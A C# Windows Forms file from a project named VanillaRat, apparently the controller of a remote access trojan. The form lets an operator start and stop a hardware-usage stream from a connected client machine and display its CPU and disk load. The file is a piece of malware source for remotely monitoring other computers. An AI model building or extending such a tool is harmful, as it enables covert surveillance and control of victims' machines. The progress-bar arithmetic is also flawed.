using System;
using System.Text;
using System.Windows.Forms;

namespace VanillaRat.Forms
{
    public partial class HardwareUsageViewer : Form
    {
        public HardwareUsageViewer()
        {
            InitializeComponent();
        }

        public int ConnectionID { get; set; }

        private void btnStart_Click(object sender, EventArgs e)
        {
            Classes.Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("StartUsageStream"));
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            Classes.Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("StopUsageStream"));
        }

        private void txtCpuUsage_TextChanged(object sender, EventArgs e)
        {
            try
            {
                int IntegerValue = Convert.ToInt32(txtCpuUsage.Text);
                if (IntegerValue == 0)
                    pbUsage.Value = 0;
                if (pbUsage.Value > IntegerValue)
                {
                    pbUsage.Value = pbUsage.Value - IntegerValue;
                }
                else
                {
                    pbUsage.Value = pbUsage.Value + IntegerValue;
                }
            }
            catch { }
        }

        private void txtDiskUsage_TextChanged(object sender, EventArgs e)
        {
            try
            {
                int IntegerValue = Convert.ToInt32(txtDiskUsage.Text);
                if (IntegerValue == 0)
                    pbDiskUsage.Value = 0;
                if (pbDiskUsage.Value > IntegerValue)
                {
                    pbDiskUsage.Value = pbDiskUsage.Value - IntegerValue;
                }
                else
                {
                    pbDiskUsage.Value = pbDiskUsage.Value + IntegerValue;
                }
            }
            catch { }
        }

        private void txtAvailableRam_TextChanged(object sender, EventArgs e)
        {
        }

        private void HardwareUsageViewer_FormClosing(object sender, FormClosingEventArgs e)
        {
            Classes.Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("StopUsageStream"));
            Classes.AutoClosingMessageBox.Show("Waiting for usage stream to stop.", "Waiting", 1000);
        }
    }
}